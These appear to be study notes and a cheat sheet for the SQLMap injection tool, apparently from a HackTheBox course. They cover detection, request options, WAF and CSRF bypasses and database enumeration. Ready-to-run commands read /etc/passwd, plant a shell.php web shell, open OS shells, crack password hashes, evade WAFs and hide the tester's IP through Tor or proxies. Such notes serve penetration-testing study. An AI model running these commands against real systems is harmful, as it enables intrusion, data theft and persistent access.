## 1. Injection Techniques

SQLMap supports six injection technique types, referenced by their letter code (`BEUSTQ`):

| Code | Technique              |
|------|------------------------|
| B    | Boolean-based blind    |
| E    | Error-based            |
| U    | Union query-based      |
| S    | Stacked queries        |
| T    | Time-based blind       |
| Q    | Inline queries         |

Use `sqlmap -h` for basic help and `sqlmap -hh` for advanced options.

## 2. Log Messages

Understanding SQLMap's output messages helps interpret scan results correctly.

| Message | Meaning |
|---------|---------|
| `URL content is stable` | No significant changes between identical repeated responses — good baseline. |
| `Parameter appears to be dynamic` | Changes to the parameter value affect the response, suggesting a DB link. |
| `Parameter might be injectable` | A DBMS error was detected — a strong indicator of potential SQLi. |
| `Parameter might be vulnerable to XSS` | Useful when no SQLi is found; pivot to XSS investigation. |
| `Back-end DBMS is '...'` | SQLMap detected the DBMS and offers to narrow payloads to that specific system. |
| `Level/risk values` | If DBMS is identified, all its payloads will be tested; otherwise only top payloads run. |
| `Reflective values found` | Parts of the payload appear in the response — SQLMap filters these out before comparison. |
| `Parameter appears to be injectable` | Likely injectable, but false positives are possible (especially for boolean/time-based). SQLMap performs additional logic checks to rule them out. A `--string` value (e.g., `--string="luther"`) means SQLMap found a constant string to distinguish TRUE from FALSE responses — making false positives very unlikely. |
| `Time-based comparison statistical model` | SQLMap collects baseline response times to statistically distinguish intentional delays — needed for reliable time-based detection. |
| `Extending UNION query injection technique tests` | UNION-based detection requires more requests. If another technique was found first, SQLMap extends the UNION test range since success is more likely. |
| `ORDER BY technique appears to be usable` | A heuristic check before sending UNION payloads. If successful, SQLMap uses binary search to quickly find the correct column count. |
| `Parameter is vulnerable` | Confirmed injectable. You can stop here or continue scanning other parameters for full coverage. |
| `sqlmap identified injection point(s)` | Final summary of all confirmed injection points with type, title, and payload. |
| `Data logged to text files` | Output saved locally under `~/.sqlmap/output/<target>/`. Subsequent runs reuse session data to minimize requests. |

## 3. Running SQLMap on HTTP Requests

### GET Request

```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

### POST Request

```bash
sqlmap "http://www.example.com/" --data "uid=1&name=test"
```

To narrow testing to a specific parameter:
```bash
sqlmap "http://www.example.com/" --data "uid=1&name=test" -p uid
```

To mark the injection point manually with `*`:
```bash
sqlmap "http://www.example.com/" --data "uid=1*&name=test"
```

### From a Saved HTTP Request File

Capture a request from Burp Suite, save it to a file, and pass it with `-r`:

```bash
sqlmap -r req.txt
```

### From a cURL Command

Copy as cURL from the browser's Network tab, then replace `curl` with `sqlmap`.

### Custom Headers and Cookies

```bash
sqlmap -u "http://example.com/" --cookie="PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c"
sqlmap -u "http://example.com/" -H "Cookie: PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c"
```

### Other Request Options

| Flag | Purpose |
|------|---------|
| `--random-agent` | Use a random User-Agent to avoid SQLMap detection |
| `--mobile` | Impersonate a smartphone |
| `--method PUT` | Change the HTTP method |
| `--cookie="id=1*"` | Test SQLi inside a cookie header |

### Supported Body Formats

SQLMap supports standard form data, as well as JSON (`{"id":1}`) and XML (`<element><id>1</id></element>`) bodies in POST requests.

## 4. Handling Errors

### Display DBMS Errors

```bash
sqlmap -u "http://example.com/vuln.php?id=1" --parse-errors
```

### Save All Traffic to File

```bash
sqlmap -u "http://example.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```

### Set Verbosity Level

```bash
sqlmap -u "http://example.com/vuln.php?id=1" -v 6 --batch
```

Verbosity ranges from 0 to 6. Level 6 prints all HTTP requests and errors in real time.

### Route Through a Proxy (e.g., Burp)

```bash
sqlmap -u "http://example.com/vuln.php?id=1" --proxy="http://127.0.0.1:8080"
```

## 5. Attack Tuning

Each SQLMap payload consists of two parts:
- **Vector** — the core SQL code (e.g., `UNION ALL SELECT 1,2,VERSION()`)
- **Boundary** — the prefix/suffix used to inject the vector correctly (e.g., `'<vector>-- -`)

### Custom Prefix/Suffix

Use when you know the surrounding SQL context:

```bash
sqlmap -u "http://example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

### Level and Risk

These expand the range of tested vectors and boundaries:

| Option | Range | Default | Effect |
|--------|-------|---------|--------|
| `--level` | 1–5 | 1 | Expands vectors and boundaries; higher = more tests, lower expected yield |
| `--risk` | 1–3 | 1 | Expands vectors by risk level; higher = tests that may cause DB instability |

At default (`--level=1 --risk=1`), up to **72 payloads** are tested per parameter.
At maximum (`--level=5 --risk=3`), up to **7,865 payloads** are tested.

> **Tip:** Use `-v 3` to compare what payloads are sent at different levels:
> ```bash
> sqlmap -u "http://example.com/?id=1" -v 3 --level=5 --risk=3
> ```

> **Note on OR payloads:** When OR-based payloads are required (e.g., login pages), raise `--risk` manually. OR payloads are excluded from default runs because they can cause unintended data changes.

## 6. Advanced Tuning

### Response Detection Methods

| Flag | Purpose |
|------|---------|
| `--code=200` | Detect by HTTP status code |
| `--titles` | Detect by HTML `<title>` tag content |
| `--string="keyword"` | Detect by a known string in the response |
| `--text-only` | Strip all HTML tags; compare plain text only |

### Limit to Specific Techniques

Use `--technique` to include only certain injection types:

```bash
# Test only boolean-based blind, error-based, and UNION-query
sqlmap -u "http://example.com/?id=1" --technique=BEU
```

### UNION Query Tuning

| Option | Purpose |
|--------|---------|
| `--union-cols=17` | Manually specify the number of UNION columns |
| `--union-char='a'` | Replace NULL filler values with a custom character |
| `--union-from=users` | Append a `FROM <table>` clause (required for Oracle) |

## 7. Bypassing Protections

### Anti-CSRF Token

```bash
sqlmap -u "http://example.com/" --data="id=1&csrf-token=XYZ" --csrf-token="csrf-token"
```

### Unique / Randomized Parameters

```bash
sqlmap -u "http://example.com/?id=1&rp=29125" --randomize=rp --batch -v 5
```

### Calculated / Hashed Parameters

```bash
sqlmap -u "http://example.com/?id=1&h=c4ca..." \
  --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5
```

### IP Concealment

```bash
# Single proxy
sqlmap -u "http://example.com/?id=1" --proxy="socks4://177.39.187.70:33283"

# Proxy list
sqlmap -u "http://example.com/?id=1" --proxy-file=proxies.txt

# Tor network (requires Tor running locally on port 9050/9150)
sqlmap -u "http://example.com/?id=1" --tor --check-tor
```

### WAF Detection and Bypass

When SQLMap starts, it sends a test payload with a fake parameter name to detect WAF presence. If a WAF is found, SQLMap uses the `identYwaf` library (80+ WAF signatures) to identify it.

To skip WAF detection entirely:
```bash
sqlmap -u "http://example.com/?id=1" --skip-waf
```

### User-Agent Blacklist Bypass

```bash
sqlmap -u "http://example.com/?id=1" --random-agent
```

### Tamper Scripts

Tamper scripts modify requests just before sending to evade WAF/IPS rules.

```bash
# List all available tamper scripts
sqlmap --list-tampers

# Use multiple tamper scripts (applied in order)
sqlmap -u "http://example.com/?id=1" --tamper=between,randomcase
```

### Chunked Transfer Encoding

Splits the POST body into chunks; blocked SQL keywords are split across chunk boundaries:

```bash
sqlmap -u "http://example.com/?id=1" --chunked
```

### HTTP Parameter Pollution (HPP)

Splits payloads across repeated parameter values (e.g., used with ASP backends that concatenate them):

```bash
# Example: ?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users
```

## 8. OS Exploitation

### Check DBA Privileges

```bash
sqlmap -u "http://example.com/?id=1" --is-dba
```

### Read a File from the Server

Requires DBA privileges:

```bash
sqlmap -u "http://example.com/?id=1" --file-read "/etc/passwd"
```

SQLMap saves the retrieved file locally.

### Write a File to the Server

Ensure `secure_file_priv` is disabled on the target:

```bash
sqlmap -u "http://example.com/?id=1" \
  --file-write "shell.php" \
  --file-dest "/var/www/html/shell.php"
```

### Get an OS Shell

```bash
sqlmap -u "http://example.com/?id=1" --os-shell

# If the above fails, force error-based technique
sqlmap -u "http://example.com/?id=1" --os-shell --technique=E
```

## 9. Cheat Sheet

### Basic Usage

| Command | Description |
|---------|-------------|
| `sqlmap -h` | Basic help |
| `sqlmap -hh` | Advanced help |
| `sqlmap -u "http://example.com/vuln.php?id=1" --batch` | Basic scan, no prompts |
| `sqlmap "http://example.com/" --data "uid=1&name=test"` | POST request scan |
| `sqlmap "http://example.com/" --data "uid=1*&name=test"` | Mark injection point manually |
| `sqlmap -r req.txt` | Scan from saved HTTP request file |
| `sqlmap -u "..." --batch --banner --current-user --current-db --is-dba --dbs` | Full info dump |
| `sqlmap -r hackthebox.txt --batch --risk=3 --level=5`| |
| `sqlmap -r hackthebox.txt --tables --batch --dbms=PostgreSQL --risk=3 --level=5`||
| `sqlmap -r hackthebox.txt --columns -t users --batch --dbms=PostgreSQL --risk=3 --level=5`||
| `sqlmap -r hackthebox.txt --dump -T users -C username,password,email --where=“email=‘Amy.Mcwilliams@proton.me’” --batch --dbms=PostgreSQL --risk=3 --level=5||


### Request Customization

| Command | Description |
|---------|-------------|
| `sqlmap -u "..." --cookie="PHPSESSID=xyz"` | Custom cookie |
| `sqlmap -u "..." --random-agent` | Random User-Agent |
| `sqlmap -u "..." --mobile` | Impersonate smartphone |
| `sqlmap -u "..." --method PUT --data "id=1"` | Change HTTP method |
| `sqlmap -u "..." --proxy="socks4://IP:PORT"` | Route through proxy |
| `sqlmap -u "..." --tor --check-tor` | Use Tor network |

### Logging and Debugging

| Command | Description |
|---------|-------------|
| `sqlmap -u "..." --parse-errors` | Show DBMS errors inline |
| `sqlmap -u "..." -t /tmp/traffic.txt` | Save all traffic to file |
| `sqlmap -u "..." -v 6` | Maximum verbosity |
| `sqlmap -u "..." --proxy="http://127.0.0.1:8080"` | Inspect via Burp |

### Payload Tuning

| Command | Description |
|---------|-------------|
| `sqlmap -u "..." --level=5 --risk=3` | Maximum payload coverage |
| `sqlmap -u "..." --technique=BEU` | Test specific techniques only |
| `sqlmap -u "..." --prefix="%'))" --suffix="-- -"` | Custom prefix/suffix |
| `sqlmap -u "..." -v 3 --level=5` | Compare payloads at verbosity 3 |

### Enumeration

| Command | Description |
|---------|-------------|
| `sqlmap -u "...?id=1" --banner --current-user --current-db --is-dba` | Basic DB info |
| `sqlmap -u "...?id=1" --dbs` | List all databases |
| `sqlmap -u "...?id=1" --tables -D testdb` | List tables in a database |
| `sqlmap -u "...?id=1" --dump -T users -D testdb` | Dump full table |
| `sqlmap -u "...?id=1" --dump -T users -D testdb -C name,surname` | Dump specific columns |
| `sqlmap -u "...?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"` | Conditional dump |
| `sqlmap -u "...?id=1" --dump -D testdb --exclude-sysdbs` | Dump full DB, skip system tables |
| `sqlmap -u "...?id=1" --schema` | Retrieve full schema of all tables |
| `sqlmap -u "...?id=1" --search -T user` | Search for table by name |
| `sqlmap -u "...?id=1" --passwords --batch` | Enumerate and crack password hashes |

### Bypasses

| Command | Description |
|---------|-------------|
| `sqlmap -u "..." --data="id=1&csrf-token=XYZ" --csrf-token="csrf-token"` | Anti-CSRF bypass |
| `sqlmap -u "...?id=1&rp=123" --randomize=rp` | Randomize a parameter value |

| `sqlmap -u "..." --tamper=between,randomcase` | Apply tamper scripts |
| `sqlmap --list-tampers` | List all tamper scripts |
| `sqlmap -u "..." --skip-waf` | Skip WAF detection |
| `sqlmap -u "..." --chunked` | Chunked transfer encoding bypass |

### Privileges and File Access

| Command | Description |
|---------|-------------|
| `sqlmap -u "...?id=1" --is-dba` | Check if current user is DBA |
| `sqlmap -u "...?id=1" --file-read "/etc/passwd"` | Read file from server |
| `sqlmap -u "...?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` | Write file to server |
| `sqlmap -u "...?id=1" --os-shell` | Open OS shell |
| `sqlmap -u "...?id=1" --os-shell --technique=E` | OS shell via error-based injection |

### Useful Flag Reference

| Flag | Description |
|------|-------------|
| `--batch` | Skip all prompts, use defaults |
| `--dbs` | Enumerate databases |
| `-D <db>` | Specify target database |
| `-T <table>` | Specify target table |
| `-C <col1,col2>` | Specify columns |
| `--start=N` / `--stop=N` | Limit rows by range |
| `--where="condition"` | Filter dump with a WHERE clause |
| `--union-cols=N` | Specify UNION column count |
| `--union-char='a'` | Custom UNION filler value |
| `--union-from=<table>` | Add FROM clause (needed for Oracle) |
| `--string="text"` | Detect TRUE response by string |
| `--titles` | Detect by page title |
| `--code=200` | Detect by HTTP status code |
| `--text-only` | Compare plain text only (strips HTML) |
